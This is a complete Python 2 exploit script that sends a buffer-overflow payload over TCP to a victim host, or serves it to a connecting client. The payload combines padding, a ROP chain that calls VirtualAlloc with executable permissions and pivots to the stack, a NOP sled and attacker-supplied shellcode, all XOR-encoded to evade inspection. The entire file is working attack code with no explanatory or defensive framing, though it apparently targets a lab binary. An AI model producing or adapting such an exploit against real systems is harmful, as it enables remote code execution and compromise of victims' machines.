#!/usr/bin/python2
import socket
from struct import pack
from sys import argv
from time import sleep

PADDING = "AAAA"
#EBP = "BBBB" * 3
EBP = "BBBB" * 1
ROP1 = pack("<I", 0x00401010 +3)	# mov [esp+8], esp; ret
ROP2 = pack("<I", 0x00401020)		# VirtualAlloc(arg0, 0x1, 0x1000, 0x40)
ROP3 = pack("<I", 0x00401040 +3)	# add esp, 4; push esp; ret
#ROP1 = pack("<I", 0x10001010 +3)      # mov [esp+8], esp; ret
#ROP2 = pack("<I", 0x10001020)         # VirtualAlloc(arg0, 0x1, 0x1000, 0x40)
#ROP3 = pack("<I", 0x10001040 +3)      # add esp, 4; push esp; ret
ROPNOP = "CCCC"
NOPs = "\x90"*0x10
#XOR_KEY = 0x77
XOR_KEY = "AO"
MSG_LEN = 4

def usage():
	print "USAGE:"
	print "{prog} c 10.0.0.10 8888 shellcode.bin [< good_traffic]".format( prog=argv[0] )
	print "{prog} b 8888 shellcode.bin [< good_traffic]".format( prog=argv[0] )
	exit()

def xor(ss):
	#return "".join([chr(ord(i)^XOR_KEY) for i in ss])
	return ''.join(chr(ord(s)^ord(c)) for s,c in zip(ss,XOR_KEY*1024*1024))

def exploit():
	victim = None
	if len(argv) < 2 or len(argv) < 4 and argv[1] == 'b' or len(argv) < 5 and argv[1] == 'c':
		usage()

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	good_traffic = []
	#while True:
	#	try:
	#		stdin = raw_input()
	#	except:
	#		break
	#	for i in xrange(0, len(stdin), MSG_LEN):
	#		good_traffic.append(stdin[i:i+MSG_LEN])

	if argv[1] == 'c':
		with open( argv[4], 'rb' ) as f:
			SHELLCODE = f.read()
		victim = (argv[2], int(argv[3]))
		s.connect(victim)
		for good in good_traffic:
			s.send(good)
			#s.recv(2)
			sleep(0.01)
		#s.send( PADDING + EBP + ROP1 + ROP2 + ROP3 + ROPNOP + NOPs + SHELLCODE )
		s.send( xor(PADDING + EBP + ROP1 + ROP2 + ROP3 + ROPNOP + NOPs + SHELLCODE) )
	elif argv[1] == 'b':
		with open( argv[3], 'rb' ) as f:
			SHELLCODE = f.read()
		s.bind( ( '0.0.0.0', int( argv[2] ) ) )
		s.listen(1)
		c,a = s.accept()
		victim = a
		for good in good_traffic:
			s.send(good)
			s.recv(2)
			sleep(0.01)
		#c.send( PADDING + EBP + ROP1 + ROP2 + ROP3 + ROPNOP + NOPs + SHELLCODE )
		c.send( xor(PADDING + EBP + ROP1 + ROP2 + ROP3 + ROPNOP + NOPs + SHELLCODE) )
		c.close()
	else:
		s.close()
		usage()

	s.close()
	return victim

if __name__ == '__main__':
	#while True:
	victim = exploit()
	if victim:
		print "[*] done " + str(victim)
